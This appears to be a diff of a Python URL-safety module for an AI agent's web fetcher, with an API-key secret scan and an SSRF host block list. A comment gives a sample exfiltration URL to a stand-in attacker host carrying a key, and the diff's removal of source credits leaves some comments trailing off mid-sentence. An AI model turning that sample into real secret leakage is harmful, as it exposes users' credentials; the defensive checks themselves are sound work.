@@ -1,14 +1,13 @@
 """
 security.py — URL safety checks before any fetch.
 
-Two checks lifted from Hermes web_extract_tool():
+Two checks lifted from 
 1. Secret scan — block URLs containing API keys (sk-, api_key=, etc.)
 2. SSRF filter — block URLs targeting private/internal networks
 
 Called by web_extract() before dispatching to any provider.
 These run on the URL strings only — no network I/O.
 
-Hermes equivalents:
 - agent.redact._PREFIX_RE (secret detection)
 - tools.url_safety.is_safe_url (SSRF protection)
 """
@@ -25,7 +24,7 @@ from urllib.parse import unquote, urlparse
 # the agent into exfiltrating secrets via URL parameters like:
 #   https://evil.com/log?key=sk-abc123...
 #
-# Hermes uses agent.redact._PREFIX_RE — we use a simplified version.
+# 
 
 _SECRET_PREFIXES = re.compile(
     r"(sk-[a-zA-Z0-9]{10})"       # OpenAI / Anthropic keys
@@ -47,7 +46,7 @@ def has_embedded_secret(url: str) -> bool:
 # Block requests to private/internal network addresses. Prevents the agent
 # from being used to probe localhost, routers, cloud metadata endpoints, etc.
 #
-# Hermes equivalent: tools.url_safety.is_safe_url()
+# 
 
 _BLOCKED_HOSTS = {
     "localhost",
@@ -94,7 +93,6 @@ def check_urls(urls: list[str]) -> tuple[list[str], list[dict]]:
     Each blocked report is a dict with url + error message, matching
     the shape web_extract() merges back into results.
 
-    Hermes does this inline in web_extract_tool(). We extract it here
     so the main function stays clean.
     """
     safe = []
